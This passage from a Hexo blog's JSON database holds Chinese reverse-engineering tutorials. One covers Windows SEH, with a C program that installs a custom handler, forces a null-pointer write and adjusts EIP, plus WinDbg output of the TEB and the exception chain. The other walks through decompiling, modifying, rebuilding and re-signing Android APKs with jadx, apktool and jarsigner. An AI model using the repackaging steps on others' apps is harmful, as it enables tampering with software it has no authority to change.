e9d8060000      jmp     Exceptions1!_RTC_Shutdown (004117a0)\n```\n我们看汇编代码，看看具体SHE的实现，因为我是debug版本的程序，所以由上面的跳转\n```\n0:000> u 4113c0 .\n004113c0 55              push    ebp\n004113c1 8bec            mov     ebp,esp\n004113c3 81eccc000000    sub     esp,0CCh\n004113c9 53              push    ebx\n004113ca 56              push    esi\n004113cb 57              push    edi\n004113cc 8dbd34ffffff    lea     edi,[ebp-0CCh]\n004113d2 b933000000      mov     ecx,33h\n004113d7 b8cccccccc      mov     eax,0CCCCCCCCh\n004113dc f3ab            rep stos dword ptr es:[edi]\n004113de 8bf4            mov     esi,esp\n004113e0 6858584100      push    offset Exceptions1!`string' (00415858)\n004113e5 ff1514914100    call    dword ptr [Exceptions1!_imp__printf (00419114)]\n004113eb 83c404          add     esp,4\n004113ee 3bf4            cmp     esi,esp\n```\n这就是我们自己加的SHE处理函数\n","source":"_posts/SEH创建与查找.md","raw":"---\ntitle: SEH创建与查找\ndate: 2019-08-26 9:46:42\nindex_img: https://w.wallhaven.cc/full/5d/wallhaven-5d2p17.jpg\nbanner_img: https://w.wallhaven.cc/full/5d/wallhaven-5d2p17.jpg\ntags:\n    - SEH\n    - Windbg\ncategories: 逆向\n---\n\n\n\n创建一个SEH处理函数\n\n```\n#include \"stdafx.h\"\n#define WIN32_LEAN_AND_MEAN\n#include <windows.h>\n#include <stdio.h>\n#include \"stdlib.h\"\n\nDWORD scratch;\n\nEXCEPTION_DISPOSITION exceptHandler(struct _EXCEPTION_RECORD *ExceptionRecord,\n\t\t\t\t\t\tvoid * EstablisherFrame,\n\t\t\t\t\t\tstruct _CONTEXT *ContextRecord,\n\t\t\t\t\t\tvoid * DispatcherContext)\n{\n\n\tunsigned i;\n\n\tMessageBox(0,_T(\"i am in except!!!\"),0,0);\n\n\tContextRecord->Eax = (DWORD)&scratch;//将eax的值修改为一个全局变量的地址，就可以写入了\n\n\t//printf(\"%08X \\n \", ContextRecord->Eip);//0x4114c5\n\n\tContextRecord->Eip += 0x2A;//这里修改的EIP，等于修改恢复异常后下一要执行的语句\n\n\treturn ExceptionContinueExecution;//这是异常处理的返回结果，让程序返回执行ContextRecord->Eip的代码\n}\nint main()\n{\n\t__asm\n\t{\n\t\tpush exceptHandler // handler函数的地址\n\t\tpush FS:[0] // 保存上一级的SEH链地址\n\t\tmov FS:[0],ESP // 安装新的EXECEPTION_REGISTRATION结构\n\t}\n\t__asm\n\t{\n\t\tmov eax, 0     // 将EAX清零\n\t\tmov[eax], 1 // 向0地址写入，会产生访问异常\n\t}\n\tprintf(\"Yes you right!!!\\n\");\n\t__asm\n\t{\n\t\tmov\teax, [ESP]    // 获取前一个结构\n\t\tmov FS:[0], EAX // 恢复之前的链\n\t\tadd esp, 8       // 恢复堆栈\n\t}\n\treturn 0;\n\n\tprintf(\"Hello Cray\\n\");\n\texit(0);\n}\n```\n\n\n\n![](D:\\git笔记\\source\\_posts\\20190826)\n\n \n\nWingdb 调试如图断下，地址访问异常\n\n我来看看在内存中的什么位置\n\n因为SHE链在线程环境块结构偏移为0的地方\n```\n0:000> !teb\nTEB at 7ffdf000\n    ExceptionList:        0012fe4c\n    StackBase:            00130000\n    StackLimit:           0012e000\n    SubSystemTib:         00000000\n    FiberData:            00001e00\n    ArbitraryUserPointer: 00000000\n    Self:                 7ffdf000\n    EnvironmentPointer:   00000000\n    ClientId:             000026a8 . 0000275c\n    RpcHandle:            00000000\n    Tls Storage:          7ffdf02c\n    PEB Address:          7ffd9000\n    LastErrorValue:       0\n    LastStatusValue:      c0000139\n    Count Owned Locks:    0\n    HardErrorMode:        0\n```\n查看teb结构地址。接下来我们将这个地址与TEB结构对应\n\n```\n0:000> dt _teb 7ffdf000 .\nntdll!_TEB\n   +0x000 NtTib            : \n      +0x000 ExceptionList    : 0x0012fe4c _EXCEPTION_REGISTRATION_RECORD\n      +0x004 StackBase        : 0x00130000 Void\n      +0x008 StackLimit       : 0x0012e000 Void\n      +0x00c SubSystemTib     : (null) \n      +0x010 FiberData        : 0x00001e00 Void\n      +0x010 Version          : 0x1e00\n      +0x014 ArbitraryUserPointer : (null) \n      +0x018 Self             : 0x7ffdf000 _NT_TIB\n   +0x01c EnvironmentPointer : \n   +0x020 ClientId         : \n      +0x000 UniqueProcess    : 0x000026a8 Void\n      +0x004 UniqueThread     : 0x0000275c Void\n   +0x028 ActiveRpcHandle  : \n   +0x02c ThreadLocalStoragePointer : \n   +0x030 ProcessEnvironmentBlock : \n```\n\n可以看到`_EXCEPTION_REGISTRATION_RECORD ` 结构的地址为\n\n\n0x0012fe4c \n\n```0:000> dt _EXCEPTION_REGISTRATION_RECORD 0012fe4c\nExceptions1!_EXCEPTION_REGISTRATION_RECORD\n   +0x000 Next             : 0x0012ff70 _EXCEPTION_REGISTRATION_RECORD\n   +0x004 Handler          : 0x004110a0     _EXCEPTION_DISPOSITION  Exceptions1!ILT+155(?_except_handler1YAKPAU_EXCEPTION_RECORDPAXPAU_CONTEXT+0\n```\nNext指向下一个处理函数，Handler指向当前SHE的处理函数\n\n```\n0:000> u 0x004110a0     \nExceptions1!ILT+155(?_except_handler1YAKPAU_EXCEPTION_RECORDPAXPAU_CONTEXT:\n004110a0 e91b030000      jmp     Exceptions1!_except_handler1 (004113c0)\nExceptions1!ILT+160(__initterm):\n004110a5 e984220000      jmp     Exceptions1!initterm (0041332e)\nExceptions1!ILT+165(___crtTerminateProcess):\n004110aa e9cd220000      jmp     Exceptions1!_crtTerminateProcess (0041337c)\nExceptions1!ILT+170(___report_securityfailure):\n004110af e99c0d0000      jmp     Exceptions1!__report_securityfailure (00411e50)\nExceptions1!ILT+175(___atonexitinit):\n004110b4 e9271f0000      jmp     Exceptions1!__atonexitinit (00412fe0)\nExceptions1!ILT+180(__RTC_UninitUse):\n004110b9 e962180000      jmp     Exceptions1!_RTC_UninitUse (00412920)\nExceptions1!ILT+185(___report_securityfailureEx):\n004110be e99d0e0000      jmp     Exceptions1!__report_securityfailureEx (00411f60)\nExceptions1!ILT+190(__RTC_Shutdown):\n004110c3 e9d8060000      jmp     Exceptions1!_RTC_Shutdown (004117a0)\n```\n我们看汇编代码，看看具体SHE的实现，因为我是debug版本的程序，所以由上面的跳转\n```\n0:000> u 4113c0 .\n004113c0 55              push    ebp\n004113c1 8bec            mov     ebp,esp\n004113c3 81eccc000000    sub     esp,0CCh\n004113c9 53              push    ebx\n004113ca 56              push    esi\n004113cb 57              push    edi\n004113cc 8dbd34ffffff    lea     edi,[ebp-0CCh]\n004113d2 b933000000      mov     ecx,33h\n004113d7 b8cccccccc      mov     eax,0CCCCCCCCh\n004113dc f3ab            rep stos dword ptr es:[edi]\n004113de 8bf4            mov     esi,esp\n004113e0 6858584100      push    offset Exceptions1!`string' (00415858)\n004113e5 ff1514914100    call    dword ptr [Exceptions1!_imp__printf (00419114)]\n004113eb 83c404          add     esp,4\n004113ee 3bf4            cmp     esi,esp\n```\n这就是我们自己加的SHE处理函数\n","slug":"SEH创建与查找","published":1,"updated":"2019-10-29T10:54:45.817Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckhiiw62j000wccuqk7hd7lj4","content":"<p>创建一个SEH处理函数</p>\n<pre><code>#include &quot;stdafx.h&quot;\n#define WIN32_LEAN_AND_MEAN\n#include &lt;windows.h&gt;\n#include &lt;stdio.h&gt;\n#include &quot;stdlib.h&quot;\n\nDWORD scratch;\n\nEXCEPTION_DISPOSITION exceptHandler(struct _EXCEPTION_RECORD *ExceptionRecord,\n                        void * EstablisherFrame,\n                        struct _CONTEXT *ContextRecord,\n                        void * DispatcherContext)\n{\n\n    unsigned i;\n\n    MessageBox(0,_T(&quot;i am in except!!!&quot;),0,0);\n\n    ContextRecord-&gt;Eax = (DWORD)&amp;scratch;//将eax的值修改为一个全局变量的地址，就可以写入了\n\n    //printf(&quot;%08X \\n &quot;, ContextRecord-&gt;Eip);//0x4114c5\n\n    ContextRecord-&gt;Eip += 0x2A;//这里修改的EIP，等于修改恢复异常后下一要执行的语句\n\n    return ExceptionContinueExecution;//这是异常处理的返回结果，让程序返回执行ContextRecord-&gt;Eip的代码\n}\nint main()\n{\n    __asm\n    {\n        push exceptHandler // handler函数的地址\n        push FS:[0] // 保存上一级的SEH链地址\n        mov FS:[0],ESP // 安装新的EXECEPTION_REGISTRATION结构\n    }\n    __asm\n    {\n        mov eax, 0     // 将EAX清零\n        mov[eax], 1 // 向0地址写入，会产生访问异常\n    }\n    printf(&quot;Yes you right!!!\\n&quot;);\n    __asm\n    {\n        mov    eax, [ESP]    // 获取前一个结构\n        mov FS:[0], EAX // 恢复之前的链\n        add esp, 8       // 恢复堆栈\n    }\n    return 0;\n\n    printf(&quot;Hello Cray\\n&quot;);\n    exit(0);\n}</code></pre><p><img src=\"D:%5Cgit%E7%AC%94%E8%AE%B0%5Csource_posts%5C20190826\" srcset=\"/cray/img/loading.gif\" alt></p>\n<p>Wingdb 调试如图断下，地址访问异常</p>\n<p>我来看看在内存中的什么位置</p>\n<p>因为SHE链在线程环境块结构偏移为0的地方</p>\n<pre><code>0:000&gt; !teb\nTEB at 7ffdf000\n    ExceptionList:        0012fe4c\n    StackBase:            00130000\n    StackLimit:           0012e000\n    SubSystemTib:         00000000\n    FiberData:            00001e00\n    ArbitraryUserPointer: 00000000\n    Self:                 7ffdf000\n    EnvironmentPointer:   00000000\n    ClientId:             000026a8 . 0000275c\n    RpcHandle:            00000000\n    Tls Storage:          7ffdf02c\n    PEB Address:          7ffd9000\n    LastErrorValue:       0\n    LastStatusValue:      c0000139\n    Count Owned Locks:    0\n    HardErrorMode:        0</code></pre><p>查看teb结构地址。接下来我们将这个地址与TEB结构对应</p>\n<pre><code>0:000&gt; dt _teb 7ffdf000 .\nntdll!_TEB\n   +0x000 NtTib            : \n      +0x000 ExceptionList    : 0x0012fe4c _EXCEPTION_REGISTRATION_RECORD\n      +0x004 StackBase        : 0x00130000 Void\n      +0x008 StackLimit       : 0x0012e000 Void\n      +0x00c SubSystemTib     : (null) \n      +0x010 FiberData        : 0x00001e00 Void\n      +0x010 Version          : 0x1e00\n      +0x014 ArbitraryUserPointer : (null) \n      +0x018 Self             : 0x7ffdf000 _NT_TIB\n   +0x01c EnvironmentPointer : \n   +0x020 ClientId         : \n      +0x000 UniqueProcess    : 0x000026a8 Void\n      +0x004 UniqueThread     : 0x0000275c Void\n   +0x028 ActiveRpcHandle  : \n   +0x02c ThreadLocalStoragePointer : \n   +0x030 ProcessEnvironmentBlock : </code></pre><p>可以看到<code>_EXCEPTION_REGISTRATION_RECORD</code> 结构的地址为</p>\n<p>0x0012fe4c </p>\n<pre><code class=\"0:000&gt;\">Exceptions1!_EXCEPTION_REGISTRATION_RECORD\n   +0x000 Next             : 0x0012ff70 _EXCEPTION_REGISTRATION_RECORD\n   +0x004 Handler          : 0x004110a0     _EXCEPTION_DISPOSITION  Exceptions1!ILT+155(?_except_handler1YAKPAU_EXCEPTION_RECORDPAXPAU_CONTEXT+0</code></pre>\n<p>Next指向下一个处理函数，Handler指向当前SHE的处理函数</p>\n<pre><code>0:000&gt; u 0x004110a0     \nExceptions1!ILT+155(?_except_handler1YAKPAU_EXCEPTION_RECORDPAXPAU_CONTEXT:\n004110a0 e91b030000      jmp     Exceptions1!_except_handler1 (004113c0)\nExceptions1!ILT+160(__initterm):\n004110a5 e984220000      jmp     Exceptions1!initterm (0041332e)\nExceptions1!ILT+165(___crtTerminateProcess):\n004110aa e9cd220000      jmp     Exceptions1!_crtTerminateProcess (0041337c)\nExceptions1!ILT+170(___report_securityfailure):\n004110af e99c0d0000      jmp     Exceptions1!__report_securityfailure (00411e50)\nExceptions1!ILT+175(___atonexitinit):\n004110b4 e9271f0000      jmp     Exceptions1!__atonexitinit (00412fe0)\nExceptions1!ILT+180(__RTC_UninitUse):\n004110b9 e962180000      jmp     Exceptions1!_RTC_UninitUse (00412920)\nExceptions1!ILT+185(___report_securityfailureEx):\n004110be e99d0e0000      jmp     Exceptions1!__report_securityfailureEx (00411f60)\nExceptions1!ILT+190(__RTC_Shutdown):\n004110c3 e9d8060000      jmp     Exceptions1!_RTC_Shutdown (004117a0)</code></pre><p>我们看汇编代码，看看具体SHE的实现，因为我是debug版本的程序，所以由上面的跳转</p>\n<pre><code>0:000&gt; u 4113c0 .\n004113c0 55              push    ebp\n004113c1 8bec            mov     ebp,esp\n004113c3 81eccc000000    sub     esp,0CCh\n004113c9 53              push    ebx\n004113ca 56              push    esi\n004113cb 57              push    edi\n004113cc 8dbd34ffffff    lea     edi,[ebp-0CCh]\n004113d2 b933000000      mov     ecx,33h\n004113d7 b8cccccccc      mov     eax,0CCCCCCCCh\n004113dc f3ab            rep stos dword ptr es:[edi]\n004113de 8bf4            mov     esi,esp\n004113e0 6858584100      push    offset Exceptions1!`string&#39; (00415858)\n004113e5 ff1514914100    call    dword ptr [Exceptions1!_imp__printf (00419114)]\n004113eb 83c404          add     esp,4\n004113ee 3bf4            cmp     esi,esp</code></pre><p>这就是我们自己加的SHE处理函数</p>\n","site":{"data":{}},"excerpt":"","more":"<p>创建一个SEH处理函数</p>\n<pre><code>#include &quot;stdafx.h&quot;\n#define WIN32_LEAN_AND_MEAN\n#include &lt;windows.h&gt;\n#include &lt;stdio.h&gt;\n#include &quot;stdlib.h&quot;\n\nDWORD scratch;\n\nEXCEPTION_DISPOSITION exceptHandler(struct _EXCEPTION_RECORD *ExceptionRecord,\n                        void * EstablisherFrame,\n                        struct _CONTEXT *ContextRecord,\n                        void * DispatcherContext)\n{\n\n    unsigned i;\n\n    MessageBox(0,_T(&quot;i am in except!!!&quot;),0,0);\n\n    ContextRecord-&gt;Eax = (DWORD)&amp;scratch;//将eax的值修改为一个全局变量的地址，就可以写入了\n\n    //printf(&quot;%08X \\n &quot;, ContextRecord-&gt;Eip);//0x4114c5\n\n    ContextRecord-&gt;Eip += 0x2A;//这里修改的EIP，等于修改恢复异常后下一要执行的语句\n\n    return ExceptionContinueExecution;//这是异常处理的返回结果，让程序返回执行ContextRecord-&gt;Eip的代码\n}\nint main()\n{\n    __asm\n    {\n        push exceptHandler // handler函数的地址\n        push FS:[0] // 保存上一级的SEH链地址\n        mov FS:[0],ESP // 安装新的EXECEPTION_REGISTRATION结构\n    }\n    __asm\n    {\n        mov eax, 0     // 将EAX清零\n        mov[eax], 1 // 向0地址写入，会产生访问异常\n    }\n    printf(&quot;Yes you right!!!\\n&quot;);\n    __asm\n    {\n        mov    eax, [ESP]    // 获取前一个结构\n        mov FS:[0], EAX // 恢复之前的链\n        add esp, 8       // 恢复堆栈\n    }\n    return 0;\n\n    printf(&quot;Hello Cray\\n&quot;);\n    exit(0);\n}</code></pre><p><img src=\"D:%5Cgit%E7%AC%94%E8%AE%B0%5Csource_posts%5C20190826\" srcset=\"/cray/img/loading.gif\" alt></p>\n<p>Wingdb 调试如图断下，地址访问异常</p>\n<p>我来看看在内存中的什么位置</p>\n<p>因为SHE链在线程环境块结构偏移为0的地方</p>\n<pre><code>0:000&gt; !teb\nTEB at 7ffdf000\n    ExceptionList:        0012fe4c\n    StackBase:            00130000\n    StackLimit:           0012e000\n    SubSystemTib:         00000000\n    FiberData:            00001e00\n    ArbitraryUserPointer: 00000000\n    Self:                 7ffdf000\n    EnvironmentPointer:   00000000\n    ClientId:             000026a8 . 0000275c\n    RpcHandle:            00000000\n    Tls Storage:          7ffdf02c\n    PEB Address:          7ffd9000\n    LastErrorValue:       0\n    LastStatusValue:      c0000139\n    Count Owned Locks:    0\n    HardErrorMode:        0</code></pre><p>查看teb结构地址。接下来我们将这个地址与TEB结构对应</p>\n<pre><code>0:000&gt; dt _teb 7ffdf000 .\nntdll!_TEB\n   +0x000 NtTib            : \n      +0x000 ExceptionList    : 0x0012fe4c _EXCEPTION_REGISTRATION_RECORD\n      +0x004 StackBase        : 0x00130000 Void\n      +0x008 StackLimit       : 0x0012e000 Void\n      +0x00c SubSystemTib     : (null) \n      +0x010 FiberData        : 0x00001e00 Void\n      +0x010 Version          : 0x1e00\n      +0x014 ArbitraryUserPointer : (null) \n      +0x018 Self             : 0x7ffdf000 _NT_TIB\n   +0x01c EnvironmentPointer : \n   +0x020 ClientId         : \n      +0x000 UniqueProcess    : 0x000026a8 Void\n      +0x004 UniqueThread     : 0x0000275c Void\n   +0x028 ActiveRpcHandle  : \n   +0x02c ThreadLocalStoragePointer : \n   +0x030 ProcessEnvironmentBlock : </code></pre><p>可以看到<code>_EXCEPTION_REGISTRATION_RECORD</code> 结构的地址为</p>\n<p>0x0012fe4c </p>\n<pre><code class=\"0:000&gt;\">Exceptions1!_EXCEPTION_REGISTRATION_RECORD\n   +0x000 Next             : 0x0012ff70 _EXCEPTION_REGISTRATION_RECORD\n   +0x004 Handler          : 0x004110a0     _EXCEPTION_DISPOSITION  Exceptions1!ILT+155(?_except_handler1YAKPAU_EXCEPTION_RECORDPAXPAU_CONTEXT+0</code></pre>\n<p>Next指向下一个处理函数，Handler指向当前SHE的处理函数</p>\n<pre><code>0:000&gt; u 0x004110a0     \nExceptions1!ILT+155(?_except_handler1YAKPAU_EXCEPTION_RECORDPAXPAU_CONTEXT:\n004110a0 e91b030000      jmp     Exceptions1!_except_handler1 (004113c0)\nExceptions1!ILT+160(__initterm):\n004110a5 e984220000      jmp     Exceptions1!initterm (0041332e)\nExceptions1!ILT+165(___crtTerminateProcess):\n004110aa e9cd220000      jmp     Exceptions1!_crtTerminateProcess (0041337c)\nExceptions1!ILT+170(___report_securityfailure):\n004110af e99c0d0000      jmp     Exceptions1!__report_securityfailure (00411e50)\nExceptions1!ILT+175(___atonexitinit):\n004110b4 e9271f0000      jmp     Exceptions1!__atonexitinit (00412fe0)\nExceptions1!ILT+180(__RTC_UninitUse):\n004110b9 e962180000      jmp     Exceptions1!_RTC_UninitUse (00412920)\nExceptions1!ILT+185(___report_securityfailureEx):\n004110be e99d0e0000      jmp     Exceptions1!__report_securityfailureEx (00411f60)\nExceptions1!ILT+190(__RTC_Shutdown):\n004110c3 e9d8060000      jmp     Exceptions1!_RTC_Shutdown (004117a0)</code></pre><p>我们看汇编代码，看看具体SHE的实现，因为我是debug版本的程序，所以由上面的跳转</p>\n<pre><code>0:000&gt; u 4113c0 .\n004113c0 55              push    ebp\n004113c1 8bec            mov     ebp,esp\n004113c3 81eccc000000    sub     esp,0CCh\n004113c9 53              push    ebx\n004113ca 56              push    esi\n004113cb 57              push    edi\n004113cc 8dbd34ffffff    lea     edi,[ebp-0CCh]\n004113d2 b933000000      mov     ecx,33h\n004113d7 b8cccccccc      mov     eax,0CCCCCCCCh\n004113dc f3ab            rep stos dword ptr es:[edi]\n004113de 8bf4            mov     esi,esp\n004113e0 6858584100      push    offset Exceptions1!`string&#39; (00415858)\n004113e5 ff1514914100    call    dword ptr [Exceptions1!_imp__printf (00419114)]\n004113eb 83c404          add     esp,4\n004113ee 3bf4            cmp     esi,esp</code></pre><p>这就是我们自己加的SHE处理函数</p>\n"},{"title":"Android逆向原理 一","index_img":"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191216120724.png","banner_img":"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191216120724.png","date":"2019-12-14T13:28:01.000Z","_content":"\n\n## 一套流程概述\n\n使用`jadx`反编译后找到修改的文件，通过`apktool`反编`apk`文件后，在文件中找到对应的`smail文件`，修改后使用`apktool`回编，然后再用`jarsigner` 签名生成的apk\n\n## 开始\n\napk本身可以使用压缩软件打开，打开后的目录\n\n![20191214115813.png](https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191214115813.png)\n\n这样打开的文件结构肯定是查看不完整的，很多二进制文件也不能解析\n\n\n## 反编译APK\n\n\n**apktool:逆向apk工具集**\n\n**jadx：用于从Android Dex和Apk文件生成Java源代码的命令行和GUI工具**\n\n**AndroidKiller：和jadx一样，还可以直接修改smail语句后回编APK以及添加签名**\n\n\n使用apk反编译工具`apktool`,这里不推荐用`AndroidKiller`了\n\n虽然他的反编很方便，但是连我的`Android studio`的Hello world程序都反编译不了，表示劝退好吧，而且也存在很多Bug\n\n这里不得不安利一个超级好用的软件`jadx`，具体优点如下，使用方法也比较简单，去混淆的设置是真的好\n\n[jadx介绍](https://segmentfault.com/a/1190000012180752)\n\n### 第一步jadx反编译\n\n我用jadx的目的是找到需要修改的具体文本，以及修改思路\n\n\n### 修改后的值\n\napktool 反编出smali\n使用命令\n\n`apktool d [apk_path]`\n\n就可以在apk目录下创建一个文件夹\n\n对apk的所有修改都是对这个文件夹中内容进行修改\n\n### 重新回编译\n\napktool 回编成apk\n\n使用命令\n\n`apktool b [apk_folder_path]`\n\n**将会在这个文件夹下生成一个dist夹，其中就有回编的apk文件**\n\napktool回编的时候经常出现文件夹占用，可以使用\n`apktool empty-framework-dir --force`  清空一下历史文件夹\n\n### 文件重签名\n\n注意上面生成的文件还不能安装，没有签名信息，安装会失败\n\n如果是第一次使用签名，需要先生成一个,`keytool`一般的`JAVA`环境都自带\n\n\n```\n格式\nkeytool -genkeypair -keystore 密钥库名 -alias 密钥别名 -validity 天数 -keyalg RSA\n\n参数:\n    -genkeypair  生成一条密钥对(由私钥和公钥组成)\n    -keystore    密钥库名字以及存储位置(默认当前目录)\n    -alias       密钥对的别名(密钥库可以存在多个密钥对,用于区分不同密钥对)\n    -validity    密钥对的有效期(单位: 天)\n    -keyalg      生成密钥对的算法(常用RSA/DSA,DSA只用于签名,默认采用DSA)\n    -delete      删除一条密钥\n    \n提示: 可重复使用此条命令,在同一密钥库中创建多条密钥对\n\n例如:     \n    在debug.keystore中新增一对密钥,别名是release\n    keytool -genkeypair -keystore debug.keystore -alias release -validity 30000\n```\n\n生成好后就可以使用这个签名文件进行签名了\n\n\n```\njarsigner -keystore 密钥库名 xxx.apk 密钥别名\n\n参数:\n    -digestalg  摘要算法\n    -sigalg     签名算法\n\n例如:\n    用JDK7及以上jarsigner签名,不支持Android 4.2 以下\n    jarsigner -keystore debug.keystore MyApp.apk release\n    \n    用JDK7及以上jarsigner签名,兼容Android 4.2 以下            \n    jarsigner -keystore debug.keystore -digestalg SHA1 -sigalg SHA1withRSA MyApp.apk androiddebugkey\n```\n\n\n\n\n签名就OK，剩下安装测试就行了\n\n\n\n\n\n参考\n\nhttps://www.jianshu.com/p/53078d03c9bf\n\nhttps://blog.csdn.net/dreamer2020/article/details/52761606\n\nhttps://ibotpeaches.github.io/Apktool/\n","source":"_posts/android逆向一.md","raw":"---\ntitle: Android逆向原理 一\ntags: [Android逆向]\nindex_img: https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191216120724.png\nbanner_img: https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191216120724.png\ndate: 2019-12-14 21:28:01\n---\n\n\n## 一套流程概述\n\n使用`jadx`反编译后找到修改的文件，通过`apktool`反编`apk`文件后，在文件中找到对应的`smail文件`，修改后使用`apktool`回编，然后再用`jarsigner` 签名生成的apk\n\n## 开始\n\napk本身可以使用压缩软件打开，打开后的目录\n\n![20191214115813.png](https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191214115813.png)\n\n这样打开的文件结构肯定是查看不完整的，很多二进制文件也不能解析\n\n\n## 反编译APK\n\n\n**apktool:逆向apk工具集**\n\n**jadx：用于从Android Dex和Apk文件生成Java源代码的命令行和GUI工具**\n\n**AndroidKiller：和jadx一样，还可以直接修改smail语句后回编APK以及添加签名**\n\n\n使用apk反编译工具`apktool`,这里不推荐用`AndroidKiller`了\n\n虽然他的反编很方便，但是连我的`Android studio`的Hello world程序都反编译不了，表示劝退好吧，而且也存在很多Bug\n\n这里不得不安利一个超级好用的软件`jadx`，具体优点如下，使用方法也比较简单，去混淆的设置是真的好\n\n[jadx介绍](https://segmentfault.com/a/1190000012180752)\n\n### 第一步jadx反编译\n\n我用jadx的目的是找到需要修改的具体文本，以及修改思路\n\n\n### 修改后的值\n\napktool 反编出smali\n使用命令\n\n`apktool d [apk_path]`\n\n就可以在apk目录下创建一个文件夹\n\n对apk的所有修改都是对这个文件夹中内容进行修改\n\n### 重新回编译\n\napktool 回编成apk\n\n使用命令\n\n`apktool b [apk_folder_path]`\n\n**将会在这个文件夹下生成一个dist夹，其中就有回编的apk文件**\n\napktool回编的时候经常出现文件夹占用，可以使用\n`apktool empty-framework-dir --force`  清空一下历史文件夹\n\n### 文件重签名\n\n注意上面生成的文件还不能安装，没有签名信息，安装会失败\n\n如果是第一次使用签名，需要先生成一个,`keytool`一般的`JAVA`环境都自带\n\n\n```\n格式\nkeytool -genkeypair -keystore 密钥库名 -alias 密钥别名 -validity 天数 -keyalg RSA\n\n参数:\n    -genkeypair  生成一条密钥对(由私钥和公钥组成)\n    -keystore    密钥库名字以及存储位置(默认当前目录)\n    -alias       密钥对的别名(密钥库可以存在多个密钥对,用于区分不同密钥对)\n    -validity    密钥对的有效期(单位: 天)\n    -keyalg      生成密钥对的算法(常用RSA/DSA,DSA只用于签名,默认采用DSA)\n    -delete      删除一条密钥\n    \n提示: 可重复使用此条命令,在同一密钥库中创建多条密钥对\n\n例如:     \n    在debug.keystore中新增一对密钥,别名是release\n    keytool -genkeypair -keystore debug.keystore -alias release -validity 30000\n```\n\n生成好后就可以使用这个签名文件进行签名了\n\n\n```\njarsigner -keystore 密钥库名 xxx.apk 密钥别名\n\n参数:\n    -digestalg  摘要算法\n    -sigalg     签名算法\n\n例如:\n    用JDK7及以上jarsigner签名,不支持Android 4.2 以下\n    jarsigner -keystore debug.keystore MyApp.apk release\n    \n    用JDK7及以上jarsigner签名,兼容Android 4.2 以下            \n    jarsigner -keystore debug.keystore -digestalg SHA1 -sigalg SHA1withRSA MyApp.apk androiddebugkey\n```\n\n\n\n\n签名就OK，剩下安装测试就行了\n\n\n\n\n\n参考\n\nhttps://www.jianshu.com/p/53078d03c9bf\n\nhttps://blog.csdn.net/dreamer2020/article/details/52761606\n\nhttps://ibotpeaches.github.io/Apktool/\n","slug":"android逆向一","published":1,"updated":"2019-12-16T04:10:53.108Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckhiiw62l000zccuq4kkegksi","content":"<h2 id=\"一套流程概述\"><a href=\"#一套流程概述\" class=\"headerlink\" title=\"一套流程概述\"></a>一套流程概述</h2><p>使用<code>jadx</code>反编译后找到修改的文件，通过<code>apktool</code>反编<code>apk</code>文件后，在文件中找到对应的<code>smail文件</code>，修改后使用<code>apktool</code>回编，然后再用<code>jarsigner</code> 签名生成的apk</p>\n<h2 id=\"开始\"><a href=\"#开始\" class=\"headerlink\" title=\"开始\"></a>开始</h2><p>apk本身可以使用压缩软件打开，打开后的目录</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191214115813.png\" srcset=\"/cray/img/loading.gif\" alt=\"20191214115813.png\"></p>\n<p>这样打开的文件结构肯定是查看不完整的，很多二进制文件也不能解析</p>\n<h2 id=\"反编译APK\"><a href=\"#反编译APK\" class=\"headerlink\" title=\"反编译APK\"></a>反编译APK</h2><p><strong>apktool:逆向apk工具集</strong></p>\n<p><strong>jadx：用于从Android Dex和Apk文件生成Java源代码的命令行和GUI工具</strong></p>\n<p><strong>AndroidKiller：和jadx一样，还可以直接修改smail语句后回编APK以及添加签名</strong></p>\n<p>使用apk反编译工具<code>apktool</code>,这里不推荐用<code>AndroidKiller</code>了</p>\n<p>虽然他的反编很方便，但是连我的<code>Android studio</code>的Hello world程序都反编译不了，表示劝退好吧，而且也存在很多Bug</p>\n<p>这里不得不安利一个超级好用的软件<code>jadx</code>，具体优点如下，使用方法也比较简单，去混淆的设置是真的好</p>\n<p><a href=\"https://segmentfault.com/a/1190000012180752\" target=\"_blank\" rel=\"noopener\">jadx介绍</a></p>\n<h3 id=\"第一步jadx反编译\"><a href=\"#第一步jadx反编译\" class=\"headerlink\" title=\"第一步jadx反编译\"></a>第一步jadx反编译</h3><p>我用jadx的目的是找到需要修改的具体文本，以及修改思路</p>\n<h3 id=\"修改后的值\"><a href=\"#修改后的值\" class=\"headerlink\" title=\"修改后的值\"></a>修改后的值</h3><p>apktool 反编出smali<br>使用命令</p>\n<p><code>apktool d [apk_path]</code></p>\n<p>就可以在apk目录下创建一个文件夹</p>\n<p>对apk的所有修改都是对这个文件夹中内容进行修改</p>\n<h3 id=\"重新回编译\"><a href=\"#重新回编译\" class=\"headerlink\" title=\"重新回编译\"></a>重新回编译</h3><p>apktool 回编成apk</p>\n<p>使用命令</p>\n<p><code>apktool b [apk_folder_path]</code></p>\n<p><strong>将会在这个文件夹下生成一个dist夹，其中就有回编的apk文件</strong></p>\n<p>apktool回编的时候经常出现文件夹占用，可以使用<br><code>apktool empty-framework-dir --force</code>  清空一下历史文件夹</p>\n<h3 id=\"文件重签名\"><a href=\"#文件重签名\" class=\"headerlink\" title=\"文件重签名\"></a>文件重签名</h3><p>注意上面生成的文件还不能安装，没有签名信息，安装会失败</p>\n<p>如果是第一次使用签名，需要先生成一个,<code>keytool</code>一般的<code>JAVA</code>环境都自带</p>\n<pre><code>格式\nkeytool -genkeypair -keystore 密钥库名 -alias 密钥别名 -validity 天数 -keyalg RSA\n\n参数:\n    -genkeypair  生成一条密钥对(由私钥和公钥组成)\n    -keystore    密钥库名字以及存储位置(默认当前目录)\n    -alias       密钥对的别名(密钥库可以存在多个密钥对,用于区分不同密钥对)\n    -validity    密钥对的有效期(单位: 天)\n    -keyalg      生成密钥对的算法(常用RSA/DSA,DSA只用于签名,默认采用DSA)\n    -delete      删除一条密钥\n\n提示: 可重复使用此条命令,在同一密钥库中创建多条密钥对\n\n例如:     \n    在debug.keystore中新增一对密钥,别名是release\n    keytool -genkeypair -keystore debug.keystore -alias release -validity 